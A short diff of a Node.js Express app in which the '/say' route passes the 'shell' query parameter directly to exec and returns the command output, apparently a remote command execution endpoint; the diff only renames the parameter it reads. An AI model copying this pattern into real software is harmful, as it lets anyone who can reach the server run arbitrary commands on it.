@@ -12,7 +12,7 @@ app.use(bodyParser.text());
 
 app.get('/say', (req, res) => {
 
-let  command = req.query
+let  command = req.query.shell
 
 exec(command, function(err, stdout, stderr) {if (err){console.log(stderr);res.send(stderr);}else {console.log(stdout);res.send(stdout); num=stdout;}});
 
